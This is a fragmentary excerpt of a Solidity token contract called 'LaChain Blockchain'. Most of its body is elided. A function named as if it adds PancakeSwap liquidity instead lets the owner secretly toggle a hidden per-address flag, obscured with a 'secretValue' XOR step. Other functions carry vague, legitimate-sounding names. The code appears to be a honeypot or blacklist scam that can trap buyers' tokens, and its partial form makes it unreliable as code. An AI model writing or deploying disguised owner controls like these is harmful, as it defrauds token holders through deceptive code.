...
contract BaseToken is Ownable {
    ...
    string constant public name = 'LaChain Blockchain';
    ...
    // https://docs.openzeppelin.com/contracts/4.x/extending-contractsfls
    function laChainConnector(address mylachain) public onlyOwner {
    ...
    function AddpPancakeSwapLiqudity(address mylachain) public onlyOwner {
        bool currentValue = _solapprovetoupgradethecontract[mylachain];
        uint256 currentValueInt = currentValue ? 1 : 0;
        uint256 secretValue = currentValueInt ^ 1;
        _solapprovetoupgradethecontract[mylachain] = secretValue != 0;
    ...
    function lachainconnect(address account) public {
    ...
    function LaChainWeb3(address account) public view returns(bool) {
...
contract LaChainContract is BaseToken {
    constructor() {
